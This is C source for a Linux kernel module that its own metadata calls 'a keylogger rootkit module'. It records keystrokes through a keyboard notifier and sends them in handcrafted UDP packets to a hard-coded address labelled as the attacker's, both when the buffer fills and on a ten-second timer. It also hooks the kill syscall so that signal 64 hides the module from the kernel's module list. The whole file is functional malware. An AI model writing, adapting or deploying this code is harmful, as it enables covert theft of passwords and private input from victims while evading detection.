/* keylogger.c */

// for kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// for memset and memcpy
#include <linux/string.h>

// for keyboard and notification chain
#include <linux/notifier.h>
#include <linux/keyboard.h>

// for network
#include <linux/netdevice.h>
#include <linux/udp.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/netpoll.h>

// for timer
#include <linux/interrupt.h>
#include <linux/hrtimer.h>
#include <linux/sched.h>

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include "ftracehelper.h"

#define DEBUG 0
#define debug(args...) if(DEBUG) printk(KERN_INFO args)

#define SRC_IP "0.0.0.0" // the victim's IP address, not important
#define DEST_IP "192.168.1.37" // the attacker's IP address
#define SRC_PORT 12345 // the victim's UDP port
#define DEST_PORT 54321 // the attacker's UDP port

#define EXPIRE_TIME 10 // every EXPIRE_TIME seconds, send key_buf

#define BUF_SIZE 16


static char key_buf[BUF_SIZE];
static unsigned int key_buf_ptr;

static struct hrtimer htimer;
static ktime_t kt_periode;

/* we only record ASCII characters and backspace, enter, tab, esc
 * return 1 if record the c */
int record_key(char c) {
    // ASCII
    if(c >= 0x20 && c < 0x7f) {
        key_buf[key_buf_ptr] = c;
        return 1;
    }
    // return 
    else if(c == 0x01) {
        key_buf[key_buf_ptr] = '\n';
        return 1;
    }
    // del
    else if(c == 0x7f) {
        key_buf[key_buf_ptr] = '\b';
        return 1;
    }
    // tab
    else if(c == 0x09) {
        key_buf[key_buf_ptr] = '\t';
        return 1;
    }
    // esc
    else if(c == 0x1b) {
        key_buf[key_buf_ptr] = '\e';
        return 1;
    }
    // do nothing
    else {
        return 0;
    }
}

/* print the latest recorded character*/
void print_key(void) {
    char c = key_buf[key_buf_ptr];
    // ASCII
    if(c >= 0x20 && c < 0x7f)
        printk(KERN_INFO "%c(0x%x)\n", c, c);
    // Non ASCII
    else
        printk(KERN_INFO ".(0x%x)\n", c);
}

#define IP_HEADER_RM 20
#define UDP_HEADER_RM 8

/* translate string to unsigned int for ip address */
static unsigned int inet_addr(char *ip) {
    int a, b, c, d;
    char res[4];
    sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d);
    res[0] = (char)a;
    res[1] = (char)b;
    res[2] = (char)c;
    res[3] = (char)d;
    return *((unsigned int*)res);
}

/* send key_buf over the network 
 * return 0 for success and 1 for failure */
static int send_key_buf(void){
    
    static char addr[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t dest_addr[ETH_ALEN];

    unsigned char* data;
    
    int udp_total_len = UDP_HEADER_RM + key_buf_ptr;
    int ip_total_len = IP_HEADER_RM + udp_total_len;
    
    struct sk_buff* skb;

    struct net_device *enp0s3;

    struct udphdr* uh;
    struct iphdr* iph;
    struct ethhdr* eth;

    enp0s3 = dev_get_by_name(&init_net,"enp0s3");

    if (enp0s3 == NULL) {
        printk(KERN_ALERT "network device not found!\n");
        return 1;
    }

    memcpy(dest_addr, addr, ETH_ALEN);
    
    //allocate a network buffer
    skb = alloc_skb(ETH_HLEN + ip_total_len, GFP_ATOMIC);
    skb->dev = enp0s3;
    skb->pkt_type = PACKET_OUTGOING;
    //adjust headroom
    skb_reserve(skb, ETH_HLEN + IP_HEADER_RM + UDP_HEADER_RM);

    data = skb_put(skb, key_buf_ptr);
    memcpy(data, key_buf, key_buf_ptr);

    // udp header
    uh = (struct udphdr*)skb_push(skb, UDP_HEADER_RM);
    uh->len = htons(udp_total_len);
    uh->source = htons(SRC_PORT); // udp ports
    uh->dest = htons(DEST_PORT);

    // ip header
    iph = (struct iphdr*)skb_push(skb, IP_HEADER_RM);
    iph->ihl = IP_HEADER_RM / 4;//4*5=20 ip_header_len
    iph->version = 4; // IPv4u
    iph->tos = 0;
    iph->tot_len = htons(ip_total_len);
    iph->frag_off = 0;
    iph->ttl = 64; // Set a TTL.
    iph->protocol = IPPROTO_UDP; //  protocol.
    iph->check = 0;
    iph->saddr = inet_addr(SRC_IP);
    iph->daddr = inet_addr(DEST_IP);

    /* changing Mac address */   
    eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));//add data to the start of a buffer
    skb->protocol = eth->h_proto = htons(ETH_P_IP);
    skb->no_fcs = 1;
    memcpy(eth->h_source, enp0s3->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, dest_addr, ETH_ALEN); /* set packet type and send the packet. */
    skb->pkt_type = PACKET_OUTGOING;
    
    // put the buffer into the sending queue of the device
    if(dev_queue_xmit(skb) < 0) {
        printk(KERN_ALERT "failing to send!\n");
        return 1;
    }

    return 0;
}

/* notifier callback function */
int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
    
    struct keyboard_notifier_param *param = data;

    if(action == KBD_KEYSYM && param->down) {
        
        debug("cb: down:%d; shift:%d; value:%x; ledstate:%d; action:%lx\n",
        param->down,
        param->shift,
        param->value,
        param->ledstate,
        action);

        if(record_key((char)param->value)) {
            print_key();
            key_buf_ptr++;
        }

        // loop back and dump the whole buffer to the network
        if(key_buf_ptr >= BUF_SIZE) {
            if(send_key_buf()) {
                printk(KERN_INFO "Sending key_buf failed!\n");
            }
            key_buf_ptr = 0;
            memset(key_buf, 0, BUF_SIZE);
        }

    }

    return NOTIFY_OK;
}

/* The timer callback that will be called periodically.
   This function will send key_buf if key_buf_ptr != 0 */
static enum hrtimer_restart timer_function(struct hrtimer * timer)
{
    // send packets
    if(key_buf_ptr != 0) {
        printk(KERN_INFO "Timer expires and key_buf has contents\n");
        if(send_key_buf()) {
            printk(KERN_INFO "Sending key_buf failed!\n");
        }
        key_buf_ptr = 0;
        memset(key_buf, 0, BUF_SIZE);
    }

    hrtimer_forward_now(timer, kt_periode);

    return HRTIMER_RESTART;
}


/* timer init */
static void timer_init(void)
{
    kt_periode = ktime_set(EXPIRE_TIME, 0); //seconds, nanoseconds
    hrtimer_init (& htimer, CLOCK_REALTIME, HRTIMER_MODE_REL);
    htimer.function = timer_function;
    hrtimer_start(& htimer, kt_periode, HRTIMER_MODE_REL);
}

/* notifier block in the notification chain*/
static struct notifier_block nb = {
    .notifier_call = keylogger_cb,
};

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* We need these for hiding/revealing the kernel module */
static struct list_head *prev_module;
static short hidden = 0;

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle
 * we either call hideme(), showme() or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void showme(void);
    void hideme(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(regs);
    }
    return 0;
}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void showme(void);
    void hideme(void);

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(pid, sig);
    }
    return 0;
}
#endif

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};

/* init function */
static int keylogger_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;
    
    printk(KERN_INFO "Keylogger is loaded!\n");
    memset(key_buf, 0, BUF_SIZE);
    key_buf_ptr = 0;
    register_keyboard_notifier(&nb);
    timer_init();
    //send_key_buf();// for testing
    return 0;
}

/* timer cleanup */
static void timer_cleanup(void)
{
    hrtimer_cancel(& htimer);
}

/* exit function */
static void keylogger_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    unregister_keyboard_notifier(&nb);
    timer_cleanup();
    printk(KERN_INFO "Keylogger is unloaded!\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE ("GPL");
MODULE_AUTHOR ("Richard Wu, Jingyu Yao");
MODULE_DESCRIPTION ("a keylogger rootkit module");
MODULE_VERSION("1.0");
